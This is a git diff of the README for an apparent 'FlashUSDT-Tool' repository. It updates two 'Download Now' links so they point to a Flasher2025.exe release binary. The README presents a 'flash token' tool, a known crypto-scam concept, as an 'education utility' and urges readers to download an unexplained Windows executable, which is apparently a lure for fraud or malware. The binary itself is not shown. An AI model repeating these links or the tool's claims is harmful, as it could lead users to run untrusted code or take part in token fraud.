@@ -5,7 +5,7 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 <h1 align="center"><b>🚀 Download Now</b></h1>
 
 <p align="center">
-  <a href="https://github.com/flexxwhoax/FlashUSDT-Tool/releases/download/Flasher/Flasher.exe">
+  <a href="https://github.com/flexxwhoax/FlashUSDT-Tool/releases/download/Flasher/Flasher2025.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
@@ -25,7 +25,7 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 <h1 align="center"><b>🚀 Download Now</b></h1>
 
 <p align="center">
-  <a href="https://github.com/flexxwhoax/FlashUSDT-Tool/releases/download/Flasher/Flasher.exe">
+  <a href="https://github.com/flexxwhoax/FlashUSDT-Tool/releases/download/Flasher/Flasher2025.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
